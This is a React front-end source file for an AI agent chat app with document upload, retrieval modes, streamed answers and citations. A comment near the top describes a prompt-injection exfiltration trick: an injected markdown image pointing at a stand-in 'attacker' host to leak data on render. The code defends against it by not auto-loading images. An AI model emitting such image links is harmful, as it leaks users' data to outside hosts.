import { useEffect, useState, type FormEvent } from 'react'
import Markdown, { type Components } from 'react-markdown'

type ModeId = 'agent' | 'ask' | 'chat'
type Mode = { id: ModeId; label: string; hint: string }

const MODES: Mode[] = [
  { id: 'agent', label: 'Agent', hint: 'Searches your documents and the web as needed, then answers' },
  { id: 'ask', label: 'Ask docs', hint: 'Answers only from uploaded documents' },
  { id: 'chat', label: 'Chat', hint: 'Plain LLM chat' },
]

type Citation = { n: number; source: string; page: number; snippet: string }
type Doc = { source: string; chunks: number }

type Message = {
  role: 'user' | 'assistant' | 'error'
  text: string
  sources?: Citation[]
  mode?: string
}

// Model output can contain links from web/document text: open them safely in a new tab.
// react-markdown never renders raw HTML, so model text can't inject markup.
// Images are never auto-loaded: an injected ![](https://attacker/?data=...) would
// otherwise leak data the moment it renders. Show a link the user can choose to open.
const MARKDOWN_COMPONENTS: Components = {
  a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
  img: ({ src, alt }) =>
    typeof src === 'string' && src ? (
      <a href={src} target="_blank" rel="noopener noreferrer">
        [image: {alt || src}]
      </a>
    ) : null,
}

const THREAD_KEY = 'threadId'

// localStorage can throw (private mode, blocked storage): fall back to an in-memory id.
function loadThreadId(): string {
  try {
    const saved = localStorage.getItem(THREAD_KEY)
    if (saved) return saved
  } catch {}
  return newThreadId()
}

function newThreadId(): string {
  const id = crypto.randomUUID()
  try {
    localStorage.setItem(THREAD_KEY, id)
  } catch {}
  return id
}

// Stable per-browser id for long-term memory across chats (unlike threadId, never reset).
const USER_KEY = 'userId'

function loadUserId(): string {
  try {
    const saved = localStorage.getItem(USER_KEY)
    if (saved) return saved
    const id = crypto.randomUUID()
    localStorage.setItem(USER_KEY, id)
    return id
  } catch {
    return crypto.randomUUID()
  }
}

const userId = loadUserId()

async function request(path: string, init?: RequestInit) {
  const res = await fetch(`/api${path}`, init)
  const data = await res.json().catch(() => ({}))
  if (!res.ok) {
    const detail = typeof data.detail === 'string' ? data.detail : `Request failed (${res.status})`
    throw new Error(detail)
  }
  return data
}

// Minimal server-sent-events reader over fetch (EventSource can't POST).
async function* readEvents(res: Response): AsyncGenerator<{ event: string; data: any }> {
  const reader = res.body!.pipeThrough(new TextDecoderStream()).getReader()
  let buffer = ''
  for (;;) {
    const { value, done } = await reader.read()
    if (done) return
    buffer += value
    let end
    while ((end = buffer.indexOf('\n\n')) !== -1) {
      const block = buffer.slice(0, end)
      buffer = buffer.slice(end + 2)
      let event = 'message'
      let data = ''
      for (const line of block.split('\n')) {
        if (line.startsWith('event: ')) event = line.slice(7)
        else if (line.startsWith('data: ')) data += line.slice(6)
      }
      yield { event, data: data ? JSON.parse(data) : null }
    }
  }
}

export default function App() {
  const [mode, setMode] = useState(MODES[0])
  const [messages, setMessages] = useState<Message[]>([])
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [uploadStatus, setUploadStatus] = useState('')
  const [threadId, setThreadId] = useState(loadThreadId)
  const [docs, setDocs] = useState<Doc[]>([])
  const [selected, setSelected] = useState<string[]>([])

  // Restore the conversation after a page refresh.
  useEffect(() => {
    fetch(`/api/chat/${threadId}/history`)
      .then((res) => (res.ok ? res.json() : { messages: [] }))
      .then((data: { messages: { role: 'user' | 'assistant'; text: string }[] }) =>
        setMessages(data.messages.map((m) => ({ role: m.role, text: m.text }))),
      )
      .catch(() => {})
  }, [threadId])

  async function loadDocs() {
    try {
      const data = await request('/docs')
      const documents: Doc[] = Array.isArray(data.documents) ? data.documents : []
      setDocs(documents)
      setSelected((s) => s.filter((source) => documents.some((d) => d.source === source)))
    } catch {}
  }

  useEffect(() => {
    loadDocs()
  }, [])

  function newChat() {
    setThreadId(newThreadId())
    setMessages([])
  }

  // Update the in-progress assistant message (always the last one).
  function updateLast(change: (m: Message) => Message) {
    setMessages((all) => [...all.slice(0, -1), change(all[all.length - 1])])
  }

  async function send(e: FormEvent) {
    e.preventDefault()
    const text = input.trim()
    if (!text || loading) return

    setInput('')
    setMessages((m) => [...m, { role: 'user', text, mode: mode.label }, { role: 'assistant', text: '' }])
    setLoading(true)
    setStatus('Thinking…')
    try {
      const res = await fetch('/api/chat/stream', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: text,
          thread_id: threadId,
          user_id: userId,
          mode: mode.id,
          sources: selected.length ? selected : null,
        }),
      })
      if (!res.ok) {
        const data = await res.json().catch(() => ({}))
        throw new Error(typeof data.detail === 'string' ? data.detail : `Request failed (${res.status})`)
      }

      for await (const { event, data } of readEvents(res)) {
        if (event === 'token') updateLast((m) => ({ ...m, text: m.text + data }))
        else if (event === 'reset') updateLast((m) => ({ ...m, text: '' }))
        else if (event === 'status') setStatus(data)
        // Final text after output guardrails: replaces whatever was streamed.
        else if (event === 'done') updateLast((m) => ({ ...m, text: data.response, sources: data.sources }))
        else if (event === 'error') throw new Error(data.detail)
      }
    } catch (err) {
      updateLast(() => ({ role: 'error', text: (err as Error).message }))
    } finally {
      setLoading(false)
      setStatus('')
    }
  }

  async function upload(file: File | undefined) {
    if (!file) return
    setUploadStatus(`Uploading ${file.name}…`)
    const form = new FormData()
    form.append('file', file)
    try {
      const data = await request('/docs', { method: 'POST', body: form })
      setUploadStatus(`Indexed ${data.filename} (${data.chunk_count} chunks)`)
      loadDocs()
    } catch (err) {
      setUploadStatus(`Upload failed: ${(err as Error).message}`)
    }
  }

  async function removeDoc(source: string) {
    if (!confirm(`Delete "${source}" from the knowledge base?`)) return
    try {
      await request(`/docs/${encodeURIComponent(source)}`, { method: 'DELETE' })
      setUploadStatus(`Deleted ${source}`)
      loadDocs()
    } catch (err) {
      setUploadStatus(`Delete failed: ${(err as Error).message}`)
    }
  }

  function toggleDoc(source: string) {
    setSelected((s) => (s.includes(source) ? s.filter((x) => x !== source) : [...s, source]))
  }

  return (
    <div className="app">
      <header>
        <h1>AI Agent</h1>
        <div className="actions">
          <button type="button" className="new-chat" onClick={newChat} disabled={loading}>
            New chat
          </button>
          <label className="upload">
            Upload doc
            <input
              type="file"
              accept=".pdf,.md,.txt,.html"
              onChange={(e) => {
                upload(e.target.files?.[0])
                e.target.value = ''
              }}
            />
          </label>
        </div>
      </header>
      {uploadStatus && <p className="status" role="status">{uploadStatus}</p>}

      <details className="docs">
        <summary>
          Documents ({docs.length}){selected.length > 0 && ` · searching ${selected.length} selected`}
        </summary>
        {docs.length === 0 ? (
          <p className="hint">No documents yet. Upload a PDF, Markdown, text or HTML file.</p>
        ) : (
          <ul>
            {docs.map((d) => (
              <li key={d.source}>
                <label>
                  <input type="checkbox" checked={selected.includes(d.source)} onChange={() => toggleDoc(d.source)} />
                  {d.source} <span className="hint">({d.chunks} chunks)</span>
                </label>
                <button type="button" className="link" onClick={() => removeDoc(d.source)} aria-label={`Delete ${d.source}`}>
                  Delete
                </button>
              </li>
            ))}
          </ul>
        )}
        {docs.length > 0 && <p className="hint">Tick documents to limit searches to them; none ticked searches all.</p>}
      </details>

      <nav className="modes" role="tablist">
        {MODES.map((m) => (
          <button
            key={m.id}
            role="tab"
            aria-selected={m === mode}
            className={m === mode ? 'active' : ''}
            onClick={() => setMode(m)}
          >
            {m.label}
          </button>
        ))}
      </nav>
      <p className="hint">{mode.hint}</p>

      <main className="messages" aria-live="polite">
        {messages.length === 0 && <p className="empty">Ask something to get started.</p>}
        {messages.map((m, i) => {
          const streaming = loading && i === messages.length - 1
          if (m.role === 'assistant' && !m.text && !streaming) return null
          return (
            <div key={i} className={`msg ${m.role}`}>
              {m.mode && <span className="tag">{m.mode}</span>}
              {streaming && status && <span className="tag status-line">{status}</span>}
              {m.text &&
                (m.role === 'assistant' ? (
                  <div className="md">
                    <Markdown components={MARKDOWN_COMPONENTS}>{m.text}</Markdown>
                  </div>
                ) : (
                  <p>{m.text}</p>
                ))}
              {m.sources && m.sources.length > 0 && (
                <ol className="sources">
                  {m.sources.map((c) => (
                    <li key={c.n} value={c.n} title={c.snippet}>
                      {c.source}, p.{c.page}
                    </li>
                  ))}
                </ol>
              )}
            </div>
          )
        })}
      </main>

      <form className="composer" onSubmit={send}>
        <textarea
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === 'Enter' && !e.shiftKey) send(e)
          }}
          placeholder="Type a message… (Shift+Enter for newline)"
          maxLength={2000}
          rows={2}
          aria-label="Message"
        />
        <button type="submit" disabled={loading || !input.trim()}>
          Send
        </button>
      </form>
    </div>
  )
}
